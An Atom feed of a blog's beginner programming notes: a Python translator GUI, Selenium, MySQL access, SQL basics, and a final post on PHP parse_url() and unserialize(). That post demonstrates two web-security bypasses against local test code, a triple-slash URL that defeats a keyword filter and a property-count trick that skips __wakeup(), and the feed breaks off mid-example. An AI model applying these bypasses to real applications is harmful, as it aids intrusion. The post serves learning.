<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://Yuririns.github.io/"/>
  <updated>2020-02-11T09:42:32.767Z</updated>
  <id>http://Yuririns.github.io/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>bs4+requests+tkinter 实现一个简易翻译小程序</title>
    <link href="http://Yuririns.github.io/2020/02/02/%E7%BF%BB%E8%AF%91%E5%B0%8F%E7%A8%8B%E5%BA%8F/"/>
    <id>http://Yuririns.github.io/2020/02/02/翻译小程序/</id>
    <published>2020-02-02T04:30:12.000Z</published>
    <updated>2020-02-11T09:42:32.767Z</updated>
    
    <content type="html"><![CDATA[<p>之前看到旁边的妹子用着有道翻译pc版，突然灵机一动想自己写一个简单的翻译小程序。<br>思路是：<br>1、用bs4和requests写个简单的爬虫翻译。（main.py）<br>2、用tkinter实现一个简单的图形化界面。(GUI.py)</p><h3 id="1、main-py"><a href="#1、main-py" class="headerlink" title="1、main.py:"></a>1、main.py:</h3><p>这里选择的翻译网站是金山词霸，打开金山词霸，输入“have fun”测试发现url变为：<br><img src="/pic/翻译小程序/1.png" alt="image"><br>url后面为所输入的需要翻译的词语/短语，所以可以通过直接拼接url并访问得到想要的翻译。<br>对访问到的网页用bs4进行过滤得到想要得到的翻译信息。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">trans</span><span class="params">(word)</span>:</span></div><div class="line">    url = <span class="string">"http://www.iciba.com/"</span></div><div class="line"></div><div class="line"></div><div class="line">    html =requests.get(url+word).text</div><div class="line"></div><div class="line">    soup = BeautifulSoup(html,<span class="string">'html.parser'</span>)</div><div class="line">    trans_list = soup.find_all(<span class="string">'li'</span>, class_=<span class="string">'clearfix'</span>)</div><div class="line"></div><div class="line">    <span class="keyword">if</span> trans_list == []:              <span class="comment">#判断为空，则没有翻译</span></div><div class="line">        <span class="keyword">return</span> <span class="string">'无对应翻译，请检查拼写是否正确！'</span></div><div class="line"></div><div class="line">    translation = <span class="string">''</span></div><div class="line">    <span class="keyword">for</span> trans <span class="keyword">in</span> trans_list:</div><div class="line"></div><div class="line">        translation = translation + trans.text.replace(<span class="string">'\n'</span>,<span class="string">' '</span>).replace(<span class="string">' '</span>,<span class="string">''</span>) + <span class="string">'\n'</span></div><div class="line">    <span class="keyword">return</span> translation</div></pre></td></tr></table></figure></p><h3 id="2、GUI-py"><a href="#2、GUI-py" class="headerlink" title="2、GUI.py:"></a>2、GUI.py:</h3><p>之前在写AES加密解密程序的时候用到了easyGUI实现图形化界面，easyGUI真的很easy，但是功能也很简易。然后看了下发现tkinter可以实现事件（消息）循环，就学习了tkinter的使用方法，写了一个简单的图形化界面的实现：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> tkinter</div><div class="line"><span class="keyword">import</span> main</div><div class="line"></div><div class="line">window = tkinter.Tk()</div><div class="line"></div><div class="line">var = tkinter.StringVar()</div><div class="line"></div><div class="line">window.title(<span class="string">'translator'</span>)</div><div class="line">window.geometry()</div><div class="line"></div><div class="line">l1 = tkinter.Label(window,text=<span class="string">'请输入需要翻译的内容：'</span>)</div><div class="line">l1.grid(row=<span class="number">0</span>)</div><div class="line"></div><div class="line">e1 = tkinter.Entry(window)</div><div class="line">e1.grid(row=<span class="number">0</span>,column=<span class="number">1</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">trans</span><span class="params">()</span>:</span></div><div class="line">    word = e1.get()</div><div class="line">    translation = main.trans(word)</div><div class="line">    var.set(translation)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">b = tkinter.Button(window,text=<span class="string">"翻译"</span>,command=trans)</div><div class="line">b.grid(row=<span class="number">1</span>,columnspan=<span class="number">2</span>,sticky=<span class="string">'W'</span>+<span class="string">'E'</span>)</div><div class="line"></div><div class="line">l2 = tkinter.Label(window,textvar=var)</div><div class="line">l2.grid(columnspan=<span class="number">2</span>)</div><div class="line"></div><div class="line">window.mainloop()</div></pre></td></tr></table></figure></p><h3 id="3、运行结果："><a href="#3、运行结果：" class="headerlink" title="3、运行结果："></a>3、运行结果：</h3><p><img src="/pic/翻译小程序/1.gif" alt="image"></p><p>这个程序目前还有一些漏洞，比如翻译的是句子或者非词库中的词语的话无法得到翻译内容，等之后再来完善一下叭_(:3J∠)_</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;之前看到旁边的妹子用着有道翻译pc版，突然灵机一动想自己写一个简单的翻译小程序。&lt;br&gt;思路是：&lt;br&gt;1、用bs4和requests写个简单的爬虫翻译。（main.py）&lt;br&gt;2、用tkinter实现一个简单的图形化界面。(GUI.py)&lt;/p&gt;
&lt;h3 id=&quot;1、m
      
    
    </summary>
    
    
      <category term="python" scheme="http://Yuririns.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>selenium学习</title>
    <link href="http://Yuririns.github.io/2020/02/01/selenium%E5%AD%A6%E4%B9%A0/"/>
    <id>http://Yuririns.github.io/2020/02/01/selenium学习/</id>
    <published>2020-02-01T01:46:42.000Z</published>
    <updated>2020-02-11T09:40:50.477Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1、Selenium简介"><a href="#1、Selenium简介" class="headerlink" title="1、Selenium简介:"></a>1、Selenium简介:</h3><p>Selenium（浏览器自动化测试框架）<br>selenium 是一个用于Web应用程序测试的工具。Selenium测试直接运行在浏览器中，就像真正的用户在操作一样。支持的浏览器包括IE（7, 8, 9, 10, 11），Mozilla Firefox，Safari，Google Chrome，Opera等。<br>这个工具的主要功能包括：测试与浏览器的兼容性——测试你的应用程序看是否能够很好得工作在不同浏览器和操作系统之上。测试系统功能——创建回归测试检验软件功能和用户需求。支持自动录制动作和自动生成 .Net、Java、Perl等不同语言的测试脚本。</p><h3 id="2、安装"><a href="#2、安装" class="headerlink" title="2、安装:"></a>2、安装:</h3><p>python安装selenium库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install selenium</div></pre></td></tr></table></figure></p><p>根据浏览器版本安装浏览器驱动Chromedriver：<a href="https://sites.google.com/a/chromium.org/chromedriver/downloads" target="_blank" rel="external">https://sites.google.com/a/chromium.org/chromedriver/downloads</a><br>下载后直接运行的话，在运行浏览器驱动时必须要指定浏览器驱动的地址，否则会报错：<br><img src="/pic/selenium学习/1.png" alt="image"><br>或者将chromedriver.exe放到Python目录下的Scripts文件夹中：<br><img src="/pic/selenium学习/2.png" alt="image"><br>这样就可以不用指定浏览器驱动地址了<br><img src="/pic/selenium学习/2.png" alt="image"></p><h3 id="3、如何使用selenium"><a href="#3、如何使用selenium" class="headerlink" title="3、如何使用selenium:"></a>3、如何使用selenium:</h3><p>1、定位元素的方法：</p><table><thead><tr><th style="text-align:left">函数</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">find_element_by_id()</td><td style="text-align:left">通过元素id来查找元素</td></tr><tr><td style="text-align:left">find_element_by_name()</td><td style="text-align:left">通过元素name来查找元素</td></tr><tr><td style="text-align:left">find_element_by_class_name()</td><td style="text-align:left">通过元素class来查找元素</td></tr><tr><td style="text-align:left">find_element_by_tag_name()</td><td style="text-align:left">通过元素的类型来查找，一般不用这种方式</td></tr><tr><td style="text-align:left">find_element_by_link_text()</td><td style="text-align:left">通过文本链接地址来查找元素</td></tr><tr><td style="text-align:left">find_element_by_partial_link_text()</td><td style="text-align:left">通过文本链接地址部分来查找元素，在超链接的文本较长的情况下进行模糊匹配</td></tr><tr><td style="text-align:left">find_element_by_xpath()</td><td style="text-align:left">通过xpath来查找元素</td></tr><tr><td style="text-align:left">find_element_by_css_selector()</td><td style="text-align:left">通过css样式来查找元素</td></tr></tbody></table><p>2、操作元素方法</p><table><thead><tr><th style="text-align:left">函数</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">clear()</td><td style="text-align:left">清除元素内容，一般是清除输入框中的数据</td></tr><tr><td style="text-align:left">send_keys()</td><td style="text-align:left">在元素中模拟按键输入</td></tr><tr><td style="text-align:left">click()</td><td style="text-align:left">点击元素</td></tr><tr><td style="text-align:left">submit()</td><td style="text-align:left">提交表单</td></tr><tr><td style="text-align:left">text()</td><td style="text-align:left">获取该元素的文本信息</td></tr><tr><td style="text-align:left">get_attribute(name)</td><td style="text-align:left">获取该元素name属性的值</td></tr></tbody></table><p>3、鼠标事件</p><table><thead><tr><th style="text-align:left">函数</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">context_click()</td><td style="text-align:left">点击右键</td></tr><tr><td style="text-align:left">double_click()</td><td style="text-align:left">双击鼠标</td></tr></tbody></table><h3 id="4、代码示例"><a href="#4、代码示例" class="headerlink" title="4、代码示例:"></a>4、代码示例:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">from selenium import webdriver</div><div class="line">import time</div><div class="line"></div><div class="line">browser = webdriver.Chrome()</div><div class="line"></div><div class="line">browser.get(&apos;https://www.baidu.com/&apos;)   #打开百度页面</div><div class="line"></div><div class="line">ele = browser.find_element_by_id(&apos;kw&apos;)   #找到元素id=kw</div><div class="line"></div><div class="line">ele.send_keys(&apos;test&apos;)  #在输入框中输入test</div><div class="line"></div><div class="line">ele = browser.find_element_by_id(&apos;su&apos;)   #找到元素id=su</div><div class="line"></div><div class="line">ele.click()   #点击查找按钮</div><div class="line"></div><div class="line">browser.quit()   #结束进程</div></pre></td></tr></table></figure><p>结果：<br><img src="/pic/selenium学习/1.gif" alt="image"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;1、Selenium简介&quot;&gt;&lt;a href=&quot;#1、Selenium简介&quot; class=&quot;headerlink&quot; title=&quot;1、Selenium简介:&quot;&gt;&lt;/a&gt;1、Selenium简介:&lt;/h3&gt;&lt;p&gt;Selenium（浏览器自动化测试框架）&lt;br&gt;sele
      
    
    </summary>
    
    
      <category term="python selenium" scheme="http://Yuririns.github.io/tags/python-selenium/"/>
    
  </entry>
  
  <entry>
    <title>Python使用MySQL数据库实例-插入大量数据</title>
    <link href="http://Yuririns.github.io/2020/01/30/Python%E4%BD%BF%E7%94%A8MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%9E%E4%BE%8B-%E6%8F%92%E5%85%A5%E5%A4%A7%E9%87%8F%E6%95%B0%E6%8D%AE/"/>
    <id>http://Yuririns.github.io/2020/01/30/Python使用MySQL数据库实例-插入大量数据/</id>
    <published>2020-01-30T11:50:55.000Z</published>
    <updated>2020-02-11T09:23:46.664Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1、目的"><a href="#1、目的" class="headerlink" title="1、目的:"></a>1、目的:</h3><p>向数据库插入大量的数据（对数据库性能测试，测试数据库压力）</p><h3 id="2、代码"><a href="#2、代码" class="headerlink" title="2、代码:"></a>2、代码:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">import MySQLdb</div><div class="line"></div><div class="line">conn = MySQLdb.connect(host=&apos;127.0.0.1&apos;,user=&apos;root&apos;,passwd=&apos;root&apos;,db=&apos;student&apos;,charset=&apos;utf8&apos;)</div><div class="line"></div><div class="line">#创建一个游标对象</div><div class="line">c = conn.cursor()</div><div class="line"></div><div class="line">for i in range(100):</div><div class="line">    command = &quot;INSERT INTO classes (class_id,class_name) VALUES (&quot;+str(i+1)+&quot;,&apos;班级&quot;+str(i+1)+&quot;&apos;);&quot;</div><div class="line">    c.execute(command)</div><div class="line"></div><div class="line">#修改数据库后需要一个commit()操作</div><div class="line">conn.commit()</div><div class="line"></div><div class="line">#关闭连接</div><div class="line">conn.close()</div></pre></td></tr></table></figure><p>结果：<br><img src="/pic/Python使用MySQL数据库实例-插入大量数据/1.png" alt="image"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;1、目的&quot;&gt;&lt;a href=&quot;#1、目的&quot; class=&quot;headerlink&quot; title=&quot;1、目的:&quot;&gt;&lt;/a&gt;1、目的:&lt;/h3&gt;&lt;p&gt;向数据库插入大量的数据（对数据库性能测试，测试数据库压力）&lt;/p&gt;
&lt;h3 id=&quot;2、代码&quot;&gt;&lt;a href=&quot;#2、
      
    
    </summary>
    
    
      <category term="SQL python" scheme="http://Yuririns.github.io/tags/SQL-python/"/>
    
  </entry>
  
  <entry>
    <title>Python使用MySQL数据库</title>
    <link href="http://Yuririns.github.io/2020/01/30/Python%E4%BD%BF%E7%94%A8MySQL%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    <id>http://Yuririns.github.io/2020/01/30/Python使用MySQL数据库/</id>
    <published>2020-01-30T09:00:12.000Z</published>
    <updated>2020-02-11T09:23:54.322Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1、Python安装MySQLdb模块"><a href="#1、Python安装MySQLdb模块" class="headerlink" title="1、Python安装MySQLdb模块:"></a>1、Python安装MySQLdb模块:</h3><p>Python连接mysql数据库可以通过MySQLdb模块，但是3.x版本的Python直接用 pip install MySQLdb 安装会报错<br>可以先这个命令进行安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install mysqlclient==1.3.12</div></pre></td></tr></table></figure></p><p>安装后MySQLdb模块就可以正常导入了：<br><img src="/pic/Python使用MySQL数据库/1.png" alt="image"></p><h3 id="2、Python连接数据库流程"><a href="#2、Python连接数据库流程" class="headerlink" title="2、Python连接数据库流程:"></a>2、Python连接数据库流程:</h3><p>连接数据库流程：<br><img src="/pic/Python使用MySQL数据库/2.png" alt="image"></p><h3 id="3、代码"><a href="#3、代码" class="headerlink" title="3、代码:"></a>3、代码:</h3><p>连接数据库并进行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">import MySQLdb</div><div class="line">conn = MySQLdb.connect(host=&apos;127.0.0.1&apos;,user=&apos;root&apos;, passwd=&apos;root&apos;, db=&apos;student&apos;,charset=&apos;utf8&apos;)</div><div class="line"></div><div class="line">#创建一个游标对象</div><div class="line">c = conn.cursor()</div><div class="line"></div><div class="line">#执行SQL语句</div><div class="line">c.execute(&apos;SELECT * FROM students&apos;)</div><div class="line"></div><div class="line">#读取所有行数据并打印，返回的是一个元组，每个元素为一行</div><div class="line">rows = c.fetchall()</div><div class="line">print(rows)</div><div class="line"></div><div class="line">#关闭连接</div><div class="line">conn.close()</div></pre></td></tr></table></figure></p><p>运行结果：<br><img src="/pic/Python使用MySQL数据库/3.png" alt="image"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;1、Python安装MySQLdb模块&quot;&gt;&lt;a href=&quot;#1、Python安装MySQLdb模块&quot; class=&quot;headerlink&quot; title=&quot;1、Python安装MySQLdb模块:&quot;&gt;&lt;/a&gt;1、Python安装MySQLdb模块:&lt;/h3&gt;&lt;p&gt;
      
    
    </summary>
    
    
      <category term="SQL python" scheme="http://Yuririns.github.io/tags/SQL-python/"/>
    
  </entry>
  
  <entry>
    <title>SQL复习（上）</title>
    <link href="http://Yuririns.github.io/2020/01/23/SQL%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
    <id>http://Yuririns.github.io/2020/01/23/SQL复习（上）/</id>
    <published>2020-01-23T11:50:12.000Z</published>
    <updated>2020-02-11T09:41:45.704Z</updated>
    
    <content type="html"><![CDATA[<p>为期8个月的产品岗的实习告一段落，接下来准备学习一下感兴趣的测试的相关技术，准备先把SQL数据库相关的知识重新过一遍，太久没接触都有点忘咯<em>(:3J∠)</em></p><h3 id="1、查询"><a href="#1、查询" class="headerlink" title="1、查询:"></a>1、查询:</h3><figure class="highlight plain"><figcaption><span><列名> FROM  <表名>  WHERE  <条件表达式> ```</条件表达式></表名></列名></span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">条件表达式可以用AND、OR、NOT</div><div class="line">&lt;条件1&gt;AND&lt;条件2&gt; 、&lt;条件1&gt;OR&lt;条件2&gt;、NOT&lt;条件&gt;</div><div class="line">例如：查找分数在80分以上的男生</div><div class="line">SELECT * FROM students WHERE score&gt;80 AND gender = &apos;M&apos;;</div><div class="line">![image](/pic/SQL复习（上）/1.png)</div><div class="line">！其中优先级：NOT&gt;AND&gt;OR</div><div class="line"></div><div class="line"></div><div class="line">### 2、ORDER BY 排序:</div><div class="line">```ORDER BY &lt;列名&gt;  (ASC/DESC)</div></pre></td></tr></table></figure><p>用ACE或者默认表示升序，DESC表示倒序<br>如果需要进一步排序，可以继续添加列名<br>例如：按照成绩从高到低进行排序，如果有相同分数的，再按照性别倒序排序<br>SELECT name, gender, score FROM students ORDER BY score DESC,gender DESC;<br><img src="/pic/SQL复习（上）/2.png" alt="image"></p><h3 id="3、LIMIT-截取"><a href="#3、LIMIT-截取" class="headerlink" title="3、LIMIT 截取:"></a>3、LIMIT 截取:</h3><figure class="highlight plain"><figcaption><span><m>  OFFSET<n>```</n></m></span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">从结果集的n号（第n+1条）开始，截取m条（或少于m条）结果</div><div class="line">索引从0开始，OFFSET 0 代表从第一条开始截取</div><div class="line">OFFSET是可选的，当只写LIMIT m 时，相当于 LIMIT m OFFSET 0</div><div class="line">例如：把结果集分页，每页3条记录，获取第一页的记录</div><div class="line">SELECT id, name, score FROM students ORDER BY score DESC LIMIT 3 OFFSET 0;</div><div class="line">![image](/pic/SQL复习（上）/3.png)</div><div class="line"></div><div class="line">### 4、聚合函数:</div><div class="line">```COUNT( &lt;列名&gt; )</div></pre></td></tr></table></figure><p>查询列的行数，COUNT(*)代表查询所有列的行数<br>例如：查询85分以上（包括85分）的男生的个数，并将列名设置别名为num<br>SELECT COUNT(*) num FROM students WHERE gender=’M’ AND score&gt;85;<br><img src="/pic/SQL复习（上）/4.png" alt="image"><br>常见聚合函数：</p><table><thead><tr><th style="text-align:left">函数</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">SUM</td><td style="text-align:left">计算某一列的合计值，该列必须为数值类型</td></tr><tr><td style="text-align:left">AVG</td><td style="text-align:left">计算某一列的平均值，该列必须为数值类型制</td></tr><tr><td style="text-align:left">MAX</td><td style="text-align:left">计算某一列的最大值</td></tr><tr><td style="text-align:left">MIN</td><td style="text-align:left">计算某一列的最小值</td></tr><tr><td style="text-align:left">COUNT</td><td style="text-align:left">计算某一列的行数</td></tr></tbody></table><h3 id="5、GROUP-BY分组"><a href="#5、GROUP-BY分组" class="headerlink" title="5、GROUP BY分组:"></a>5、GROUP BY分组:</h3><p><code>GROUP BY &lt;列名&gt;</code><br>GROUP BY子句指定了按照某一列分组聚合<br>例如：查询每个班级男生和女生的平均<br>SELECT class_id,AVG(score),gender FROM  students GROUP BY class_id,gender;<br><img src="/pic/SQL复习（上）/5.png" alt="image"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;为期8个月的产品岗的实习告一段落，接下来准备学习一下感兴趣的测试的相关技术，准备先把SQL数据库相关的知识重新过一遍，太久没接触都有点忘咯&lt;em&gt;(:3J∠)&lt;/em&gt;&lt;/p&gt;
&lt;h3 id=&quot;1、查询&quot;&gt;&lt;a href=&quot;#1、查询&quot; class=&quot;headerlink&quot;
      
    
    </summary>
    
    
      <category term="SQL" scheme="http://Yuririns.github.io/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>PHP（parse_url和反序列化）</title>
    <link href="http://Yuririns.github.io/2019/04/30/PHP%EF%BC%88parse_url%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%89/"/>
    <id>http://Yuririns.github.io/2019/04/30/PHP（parse_url和反序列化）/</id>
    <published>2019-04-30T06:14:23.000Z</published>
    <updated>2019-05-02T02:37:59.094Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、parse-url"><a href="#1、parse-url" class="headerlink" title="1、parse_url()"></a>1、parse_url()</h2><p>parse_url — 解析 URL，返回其组成部分</p><blockquote><p>parse_url ( string $url [, int $component = -1 ] ) : mixed</p></blockquote><p>本函数解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分。  本函数不是用来验证给定 URL 的合法性的，只是将其分解为下面列出的部分。不完整的 URL 也被接受，parse_url() 会尝试尽量正确地将其解析。</p><p>返回值：<br>    • scheme - 如 http<br>    • host<br>    • port<br>    • user<br>    • pass<br>    • path<br>    • query - 在问号 ? 之后<br>  •fragment - 在散列符号 # 之后<br>如果指定了 component 参数， parse_url() 返回一个 string （或在指定为 PHP_URL_PORT 时返回一个 integer）而不是 array。如果 URL 中指定的组成部分不存在，将会返回 NULL。</p><p>$Url=”<a href="http://username:password@hostname/path?arg=value#anchor" target="_blank" rel="external">http://username:password@hostname/path?arg=value#anchor</a>“<br>parse_url($url)的返回值为：<br><img src="/pic/PHP（parse_url和反序列化）/1.png" alt="image"></p><p>Note:<br>parse_url() 是专门用来解析 URL 而不是 URI 的。不过为遵从 PHP 向后兼容的需要有个例外，对 file:// 协议允许三个斜线（file:///…）。其它任何协议都不能这样。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$url=parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]);</div><div class="line">var_dump($url);</div><div class="line">parse_str($url[<span class="string">'query'</span>],$query);</div><div class="line">var_dump($query);</div><div class="line"><span class="keyword">foreach</span>($query <span class="keyword">as</span> $value)&#123;</div><div class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/flag/"</span>,$value)) &#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>);</div><div class="line">            <span class="keyword">exit</span>();</div><div class="line">&#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line">$value = $_GET[<span class="string">"value"</span>];</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span> . $value;</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;right"</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>当url为：<a href="http://127.0.0.1/test.php?value=flag时" target="_blank" rel="external">http://127.0.0.1/test.php?value=flag时</a><br>返回<br><img src="/pic/PHP（parse_url和反序列化）/2.png" alt="image"><br>当url为：<a href="http://127.0.0.1///test.php?value=flag时" target="_blank" rel="external">http://127.0.0.1///test.php?value=flag时</a><br>parse_url()会返回false，绕过验证:<br><img src="/pic/PHP（parse_url和反序列化）/3.png" alt="image"></p><h2 id="2、反序列化"><a href="#2、反序列化" class="headerlink" title="2、反序列化"></a>2、反序列化</h2><blockquote><p>serialize ( mixed $value ) : string<br>serialize() 返回字符串，此字符串包含了表示 value 的字节流，可以存储于任何地方。<br>这有利于存储或传递 PHP 的值，同时不丢失其类型和结构。</p><p>unserialize ( string $str ) : mixed<br>unserialize() 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</div><div class="line"><span class="keyword">private</span> $test1 = <span class="string">"aaa"</span>;</div><div class="line"><span class="keyword">public</span> $test2 = <span class="string">"bbb"</span>;</div><div class="line"><span class="keyword">protected</span> $test3 = <span class="string">"ccc"</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$test = <span class="keyword">new</span> test();</div><div class="line"><span class="keyword">echo</span>(serialize($test));</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>输出结果如下：<br><img src="/pic/PHP（parse_url和反序列化）/4.png" alt="image"></p><pre><code>O:4:&quot;test&quot;:3:{s:11:&quot;\00test\00test1&quot;;s:3:&quot;aaa&quot;;s:5:&quot;test2&quot;;s:3:&quot;bbb&quot;;s:8:&quot;\00*\00test3&quot;;s:3:&quot;ccc&quot;;}</code></pre><h3 id="2、1绕过-wakeup魔术方法"><a href="#2、1绕过-wakeup魔术方法" class="headerlink" title="2、1绕过__wakeup魔术方法"></a>2、1绕过__wakeup魔术方法</h3><p>php面向对象的magic function(魔术方法):</p><pre><code>1. __construct()__contstruct()函数被称为构造函数，当实例化类的时候会自动调用该函数2. __destruct()__destruct()函数被称为析构函数，当类结束的时候自动调用该函数3. __sleep()__sleep()函数是当php进行序列化操作（serialize）的时候自动调用该函数，可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。4. __wakeup()__wakeup()函数是当php进行反序列化操作（unserialize）的时候自动调用该函数5. __toString()__toString()函数是当对象被当做字符串的时候会自动调用该函数</code></pre><p>__wakeup()函数是当php进行反序列化操作（unserialize）的时候自动调用的，而当成员属性数目大于实际数目时可绕过wakeup方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</div><div class="line">    <span class="keyword">public</span> $aaa = <span class="string">"222"</span>;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;aaa = <span class="string">"222"</span>;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"Wake up!&lt;br/&gt;"</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"Destruct&lt;br/&gt;aaa="</span>.<span class="keyword">$this</span>-&gt;aaa;</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$test1 = <span class="string">'O:4:"test":1:&#123;s:3:"aaa";s:3:"111";&#125;'</span>;</div><div class="line"></div><div class="line">unserialize($test1);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>变量aaa默认值为222，在反序列化时先将传入的值111赋给变量aaa，再在反序列化后执行__wakeup()魔术方法将变量aaa的值重置为222，最后结果：<br><img src="/pic/PHP（parse_url和反序列化）/5.png" alt="image"></p><p>而绕过__wakeup()魔术方法的方法就是让成员属性数目大于实际数目：</p><pre><code>$test1 = 